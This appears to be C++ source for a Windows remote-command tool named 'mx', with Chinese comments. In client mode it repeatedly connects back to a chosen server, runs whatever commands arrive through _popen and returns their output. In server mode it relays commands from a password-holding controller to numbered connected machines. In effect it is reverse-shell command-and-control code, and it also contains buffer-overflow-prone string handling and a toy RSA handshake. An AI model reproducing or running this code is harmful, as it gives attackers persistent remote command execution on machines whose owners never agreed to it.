#include "mx.h"

SOCKET ListenSocket;
sockaddr_in addr;

void mux_server_add(SOCKET& ListenSocket, char* passwd);
void mux_server(SOCKET& ListenSocket, char* passwd);
void mux_client(char* mux_ip, int mux_port, char* mux_passwd);
int mux_rsa_recv(SOCKET& clientSocket, char* msg);
void mux_server_msg(char* passwd);
char* mux_rsa_send(SOCKET& ListenSocket);
DWORD WINAPI mux_client_recv_msg(LPVOID mux_passwd);
DWORD WINAPI mux_console_recv_msg(LPVOID mux_passwd);

int main(int argc, char* argv[]) {
    switch (argc)
    {
    case 2:
        if (argv[1][0] == 'P' && argv[1][1] == 'H') {
            char Current_path[1024];
            char* pwd = _getcwd(Current_path, 1024);
            printf("[%s]$ ", Current_path);
        } return 0;
    case 3:
        bl_client = false;
        break;
    case 4:
        break;
    default:
        printf("mx port ip/passwd passwd/null\n");
        return 0;
    }
    WSADATA wsaData; if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 0;
    mux_client(argv[2], atoi(argv[1]), argv[3]);
    WSACleanup();
}

//客户端逻辑
void mux_client(char* mux_ip, int mux_port, char* mux_passwd) {
    ListenSocket = socket(AF_INET, SOCK_STREAM, 0);
    struct timeval timeout;
    timeout.tv_sec = 30000;
    timeout.tv_usec = 0;
    setsockopt(ListenSocket,
        SOL_SOCKET, SO_RCVTIMEO,
        (char*)&timeout, sizeof(timeout));

    if (ListenSocket == INVALID_SOCKET) { WSAGetLastError(); return; }
    
    addr.sin_family = AF_INET;
    if (bl_client) addr.sin_addr.s_addr = inet_addr(mux_ip); else addr.sin_addr.s_addr = INADDR_ANY; //绑定IP地址
    addr.sin_port = htons(mux_port); //客户端

    if (bl_client) {
        char* pos = strchr(mux_passwd, ':');
        int bl_connect = 1;

        while (bl_connect) {
            if (connect(ListenSocket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
                //printf("Connection failed. Retrying...\n");
                Sleep(5000);
                continue;
            }
            bl_connect = mux_rsa_recv(ListenSocket, mux_passwd); // 接收公钥，加密发送密钥
            //printf("bl_connect = %d\n", bl_connect);
            if (bl_connect == 1) {
                closesocket(ListenSocket); // 关闭 socket
                ListenSocket = socket(AF_INET, SOCK_STREAM, 0);
                setsockopt(ListenSocket,
                    SOL_SOCKET, SO_RCVTIMEO,
                    (char*)&timeout, sizeof(timeout));
                Sleep(5000);
            }
        }

        if (pos == NULL)
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mux_client_recv_msg, (LPVOID)mux_passwd, 0, NULL);
        else
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mux_console_recv_msg, (LPVOID)mux_passwd, 0, NULL);
        printf("$ ");

        while (buffer[0] != ';') {
            gets_s(buffer);
            if (buffer[0] == ';') break;
            send(ListenSocket, buffer, strlen(buffer), 0);
        }
    }
    else {
        if (bind(ListenSocket, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) { closesocket(ListenSocket);  return; }
        if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR) { closesocket(ListenSocket); return; }
        mux_server(ListenSocket, mux_ip);
    }
}

//控制端端接收信息
DWORD WINAPI mux_console_recv_msg(LPVOID mux_passwd)
{
    char mux_client_recv_buf[1024];
    int bl_connect = 1;
    int re_recv_len = 0;
    while (1) {
        int recv_len = recv(ListenSocket, mux_client_recv_buf, 1024, 0);
        //printf("[%d]", recv_len);
        if (recv_len == 1) { re_recv_len = 0; continue; }
        if (recv_len > 0) fwrite(mux_client_recv_buf, 1, recv_len, stdout);
        if (recv_len <= 0) {
            re_recv_len++;
            if (re_recv_len > 5) {
                while (bl_connect) {
                    if (bl_connect == 1) {
                        closesocket(ListenSocket); // 关闭 socket
                        ListenSocket = socket(AF_INET, SOCK_STREAM, 0);
                        struct timeval timeout;
                        timeout.tv_sec = 30000;
                        timeout.tv_usec = 0;
                        setsockopt(ListenSocket,
                            SOL_SOCKET, SO_RCVTIMEO,
                            (char*)&timeout, sizeof(timeout));
                    }
                    if (connect(ListenSocket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
                        //printf("Connection failed. Retrying...\n");
                        Sleep(5000);
                        continue;
                    }
                    //printf("mux_passwd = %s ;\n", (char*)mux_passwd);
                    bl_connect = mux_rsa_recv(ListenSocket, (char*)mux_passwd); // 接收公钥，加密发送密钥
                    //printf("bl_connect = %d ; mux_passwd = %s ;\n", bl_connect, (char*)mux_passwd);
                    Sleep(5000);
                }
                bl_connect = 1;
                re_recv_len = 0;
            }
            if (recv_len < 0) send(ListenSocket, "", 1, 0);
            Sleep(1000);
        }
        mux_client_recv_buf[0] = 0;
    }
}

//客户端接收信息
DWORD WINAPI mux_client_recv_msg(LPVOID mux_passwd) {
    FILE* fp = NULL;
    char mux_client_recv_buf[1025];
    int bl_connect = 1;
    int re_recv_len = 0;
    while (1) {
        int recv_len = recv(ListenSocket, mux_client_recv_buf, 1024, 0);
        //printf("[%d,%d]", recv_len, re_recv_len);
        if (recv_len == 1) { re_recv_len = 0; continue; }
        if (recv_len <= 0) {
            re_recv_len++; 
            if (re_recv_len > 5) {
                while (bl_connect) {
                    if (bl_connect == 1) {
                        closesocket(ListenSocket); // 关闭 socket
                        ListenSocket = socket(AF_INET, SOCK_STREAM, 0);
                        struct timeval timeout;
                        timeout.tv_sec = 30000;
                        timeout.tv_usec = 0;
                        setsockopt(ListenSocket,
                            SOL_SOCKET, SO_RCVTIMEO,
                            (char*)&timeout, sizeof(timeout));
                    }
                    if (connect(ListenSocket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
                        //printf("Connection failed. Retrying...\n");
                        Sleep(5000);
                        continue;
                    }
                    //printf("mux_passwd = %s ;\n", (char*)mux_passwd);
                    printf("\n");
                    bl_connect = mux_rsa_recv(ListenSocket, (char*)mux_passwd); // 接收公钥，加密发送密钥
                    printf("$ ");
                    //printf("bl_connect = %d ; mux_passwd = %s ;\n", bl_connect, (char*)mux_passwd);
                    Sleep(5000);
                }
                bl_connect = 1;
                re_recv_len = 0;
            }
            if (recv_len < 0) send(ListenSocket, "", 1, 0);
            Sleep(1000);
            continue;
        }
        fwrite(mux_client_recv_buf, 1, recv_len, stdout); printf("\n");
        mux_client_recv_buf[recv_len] = 0;
        if (!strcmp(mux_client_recv_buf, "cls")) {
            system("cls");
			strcpy(mux_client_recv_buf, "\"");
            strcat(mux_client_recv_buf, _pgmptr);
            strcat(mux_client_recv_buf, "\" PH");
        } else {
            strcat(mux_client_recv_buf, " 2>&1&echo;&\"");
            strcat(mux_client_recv_buf, _pgmptr);
            strcat(mux_client_recv_buf, "\" PH");
        }
        fp = _popen(mux_client_recv_buf, "r");
        if (!fp) { continue; } int fgets_tmp = 0;
        while (fgets(buffer, sizeof(buffer) - 1, fp) != 0) { //循环命令返回值
            fgets_tmp++; printf("%s", buffer);
            send(ListenSocket, buffer, strlen(buffer), 0);
        }
        if (fgets_tmp != 0) {
            buffer[strlen(buffer) - 3] = '\0';
            SetCurrentDirectoryA(buffer + 1);
        }
        _pclose(fp);
    }
}

//服务器核心wsapoll监听所有事件
void mux_server(SOCKET& ListenSocket, char* passwd) {
    for (int i = 0; i < MAX_SOCKETS; ++i) fdArray[i].fd = INVALID_SOCKET;
    fdArray[0].fd = ListenSocket;
    fdArray[0].events = POLLRDNORM; //POLLIN
    fdArray[0].revents = 0;
    while (1) {
        int ret = WSAPoll(fdArray, fdArray_size, 60000);
        time_t current_time = time(nullptr);
        if (ret == SOCKET_ERROR) continue;
        else if (ret == 0) {
            for (int i = 1; i < fdArray_size; ++i) if (fdArray[i].fd != INVALID_SOCKET) {
                time_t bl_current_time = current_time - muxClients[i].current_time;
                if (bl_current_time > 180) { remove_socket(i); --i; }
            }
        }
        else {
            if (fdArray[0].revents & POLLRDNORM) {
                mux_server_add(ListenSocket, passwd);
            } mux_server_msg(passwd);
        }
    }
    for (int i = 0; i < fdArray_size; ++i) if (fdArray[i].fd != INVALID_SOCKET) { remove_socket(i); --i; }
}

//服务端解密后，添加到套接字数组
void mux_server_add(SOCKET& ListenSocket, char* passwd) {
    sockaddr_in clientAddr;
    int clientAddrLen = sizeof(clientAddr);
    SOCKET clientSocket = accept(ListenSocket, (sockaddr*)&clientAddr, &clientAddrLen);
    if (clientSocket == INVALID_SOCKET) return;
    else {
        char* plaintext = mux_rsa_send(clientSocket); //发送公钥，接收加密信息，解密
        if (plaintext[0] == 0) { free(plaintext); closesocket(clientSocket); return; }
        int recv_len = recv(clientSocket, buffer, sizeof(buffer), 0);//接收密文
        if (fdArray_size >= MAX_SOCKETS-3) {
            if (strcmp(plaintext, passwd) || fdArray_size > MAX_SOCKETS-2) {
                free(plaintext); closesocket(clientSocket); return; 
            }
        }
        for (int j = 0; j < MAX_SOCKETS; ++j) {
            if (fdArray[j].fd == INVALID_SOCKET) {
                fdArray[fdArray_size].fd = clientSocket;
                fdArray[fdArray_size].events = POLLRDNORM;
                fdArray[fdArray_size].revents = 0;
                strcpy(muxClients[fdArray_size].name, buffer);
                muxClients[fdArray_size].current_time = time(nullptr);

                strcpy(muxClients[fdArray_size].passwdmd5, plaintext);
                strcpy(muxClients[fdArray_size].name, buffer);

                struct tm* local_time = localtime(&muxClients[fdArray_size].current_time);
                char time_string[100];
                strftime(time_string, sizeof(time_string), "%Y-%m-%d %H:%M:%S", local_time);
                if (!strcmp(muxClients[fdArray_size].passwdmd5, passwd))
                    sprintf(buffer, "[%s] %d + #%d %s", time_string, clientSocket ,fdArray_size, muxClients[fdArray_size].name);
                else
                    sprintf(buffer, "[%s] %d + #%d %s %s", time_string, clientSocket,fdArray_size, muxClients[fdArray_size].passwdmd5, muxClients[fdArray_size].name);
                while ((strlen(mux_history) + strlen(buffer) + 2) > 4096) {
                    char* pos = strchr(mux_history, '\n');
                    if (pos != nullptr) {
                        int index = pos - mux_history + 1; // +1 to remove the '\n'
                        strcpy(mux_history, mux_history + index);
                    }
                }
                strcat(mux_history, buffer);
                strcat(mux_history, "\n\0");
                printf("%s\n", buffer);
                ++fdArray_size; break;
            }
        }
        free(plaintext);
    }
}

//服务端发送公钥，接收密文，解析密文
char* mux_rsa_send(SOCKET& ListenSocket) { //发送公钥，接收加密信息，解密 ，服务端
    uint64_t n, e, d;
    generate_keys(&n, &e, &d); //获取随机密钥
    //printf("公钥: (n: %" PRIu64 ", e: %" PRIu64 ")\n", n, e);
    //printf("私钥: (n: %" PRIu64 ", d: %" PRIu64 ")\n", n, d);
    sprintf(buffer, "n: %" PRIu64 ", e: %" PRIu64, n, e);
    //printf("发送公钥:[%s]\n", buffer);
    send(ListenSocket, buffer, strlen(buffer), 0);// 发送 e,n 公钥
    int recv_len = recv(ListenSocket, buffer, sizeof(buffer), 0);//接收密文
    printf("接收密文[%d]:[%s]\n", recv_len, buffer);
    size_t length = 0; const char* step_size = buffer; bool is_passwd = false;
    for (const char* p = buffer; *p != '\0'; p++) {
        if (*p == ' ') {
            is_passwd = true;
            if (p - step_size > 6) { is_passwd = false; break; }
            step_size = p; length++;
        }
    }
    if (!is_passwd) {
        char* decrypted = (char*)malloc(1);
        decrypted[0] = 0;
        return decrypted;
    }
    char* decrypted = (char*)malloc(length + 1);
    if (recv_len > 1024) return decrypted;
    //printf("明文长度:[%d]\n", length);
    mux_dexc(d, n, length, decrypted, buffer); //解密密文
    printf("解密后[%d]:[%s]\n", length, decrypted);
    return decrypted;
}

//客户端接收公钥，发送密文
int mux_rsa_recv(SOCKET& clientSocket, char* msg) { //接收公钥，发送加密信息，客户端
    int recv_len = recv(clientSocket, buffer, sizeof(buffer), 0);
    if (recv_len < 1024) buffer[recv_len] = 0;
    char* plaintext;

    char* pos = strchr(msg, ':');
    if (pos == NULL) {
        plaintext = muxRandom();
        printf("%s\n", plaintext);
    } else plaintext = pos + 1;

    if (recv_len > 0 && recv_len < 1024) {
        if (buffer[0] != 'n' || buffer[1] != ':' || buffer[2] != ' ') return 1;
        uint64_t n, e;
        size_t length = strlen(plaintext);
        int int_ssc = sscanf(buffer, "n: %" PRIu64 ", e: %" PRIu64, &n, &e);
        //printf("解析公钥:[n = %llu, e = %llu]\n", n, e);
        mux_rsa(e, n, length, plaintext, buffer);
        //printf("%s\n", buffer);
        if (strlen(buffer) < 1024) send(clientSocket, buffer, strlen(buffer) + 1, 0); //发出加密的密文

        if (pos == NULL) {
            send(clientSocket, msg, strlen(msg) + 1, 0);
        }
        else {
            *pos = 0;
            send(clientSocket, msg, strlen(msg) + 1, 0);
            *pos = ':';
        }
    }
    else return 1;
    return 0;
}

//服务端处理客户端消息
void mux_server_msg(char* passwd) {
    for (int i = 1; i < fdArray_size; ++i) {
        if (fdArray[i].revents & POLLRDNORM) {
            int bytesReceived = recv(fdArray[i].fd, buffer, sizeof(buffer), 0);
            muxClients[i].current_time = time(nullptr);
            if (bytesReceived > 0) {
                if (!strcmp(muxClients[i].passwdmd5, passwd)) {
                    // 控制端
                    printf("mux[%s][%d][#%d][%d]:[%.*s]\n", muxClients[i].name, fdArray[i].fd, i, bytesReceived, bytesReceived, buffer);
                    switch (buffer[0])
                    {
                    case '/':
                        for (int j = 1; j < fdArray_size; ++j) {
                            struct tm* local_time = localtime(&muxClients[j].current_time);
                            char time_string[100];
                            strftime(time_string, sizeof(time_string), "%Y-%m-%d %H:%M:%S", local_time);
                            if (!strcmp(muxClients[j].passwdmd5, passwd)) {
                                sprintf(buffer, "[%s] %d #%d %lld %s\n",
                                    time_string, fdArray[j].fd, j, time(nullptr) - muxClients[j].current_time,
                                    muxClients[j].name);
                            } else {
                                sprintf(buffer, "[%s] %d #%d %lld %s %s\n",
                                    time_string, fdArray[j].fd, j, time(nullptr) - muxClients[j].current_time,
                                    muxClients[j].passwdmd5, muxClients[j].name);
                            }
                            printf("%s", buffer);
                            send(fdArray[i].fd, buffer, strlen(buffer), 0);
                        }
                        sprintf(buffer, "[%d]$ ", mux_selected); send(fdArray[i].fd, buffer, strlen(buffer), 0);
                        break;
                    case '#':
                        if (bytesReceived > 1) {
                            buffer[bytesReceived] = 0; mux_selected = atoi(buffer + 1);
                            sprintf(buffer, "[%d]$ ", mux_selected);
                            send(fdArray[i].fd, buffer, strlen(buffer), 0); break;
                        }
                        printf("%s", mux_history); send(fdArray[i].fd, mux_history, strlen(mux_history), 0);
                         sprintf(buffer, "[%d]$ ", mux_selected); printf("%s", buffer); send(fdArray[i].fd, buffer, strlen(buffer), 0);
                        break;
                    default:
                        if (bytesReceived == 1) { send(fdArray[i].fd, "", 1, 0); continue; }
                        if (i != mux_selected) send(fdArray[mux_selected].fd, buffer, bytesReceived, 0);
                        break;
                    }
                }
                else { //客户端
                    printf("Cli[%s][%d][#%d][%d]\n", muxClients[i].name, fdArray[i].fd, i, bytesReceived);
                    if (bytesReceived == 1) { send(fdArray[i].fd, "", 1, 0); continue; }
                    if (bytesReceived < 1023) {
                        buffer[bytesReceived] = '\n';
                        buffer[bytesReceived + 1] = 0;
                    }
                    for (int j = 1; j < fdArray_size; ++j) {
                        if (i != j && !strcmp(muxClients[j].passwdmd5, passwd) && mux_selected == i)
                            send(fdArray[j].fd, buffer, bytesReceived, 0); //接收客户端消息，发送给总控制端

                        if (i != j && !strcmp(muxClients[j].passwdmd5, muxClients[i].passwdmd5))
                            send(fdArray[j].fd, buffer, bytesReceived, 0); //接收客户端消息，发送给客户端
                    }
                }
            }
        }
        else if (fdArray[i].revents & POLLHUP) {
            remove_socket(i); --i;
        }
        else if (time(nullptr) - muxClients[i].current_time > 180) { remove_socket(i); --i; }
    }
}